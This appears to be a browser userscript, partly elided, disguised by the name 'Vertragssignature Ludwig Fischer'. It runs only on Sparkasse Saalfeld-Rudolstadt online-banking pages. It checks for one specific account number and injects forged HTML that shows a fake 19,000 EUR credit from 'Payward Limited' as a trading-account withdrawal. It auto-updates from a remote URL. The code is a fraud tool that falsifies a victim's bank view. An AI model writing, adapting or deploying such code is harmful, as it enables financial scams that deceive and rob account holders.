// ==UserScript==
// @name         Vertragssignature Ludwig Fischer
...
// @match        https://www.sparkasse-saalfeld-rudolstadt.de/de/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.sparkasse-saalfeld-rudolstadt.de/de/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.sparkasse-saalfeld-rudolstadt.de/de/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/469756/Vertragssignature%20Ludwig%20Fischer.user.js
// @updateURL https://update.greasyfork.org/scripts/469756/Vertragssignature%20Ludwig%20Fischer.meta.js
// ==/UserScript==
...
(function() {
    ...
    var xamount = 19000;
    var buchung = 20000;
    var buchungDecimal = "83";
    var buchungTextsZahl = "144.278";
    var accountsecurity = "1003 2682 90";
    ...
    if (window.location.href.indexOf("umsaetze") > 0) {
        ...
        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == accountsecurity ){
            ...
            var x2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 19.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Withdrawal Trading Account: AY01-503DE-SM</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">19.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">19.000,00 EUR</span></div></div></div></div></li>';
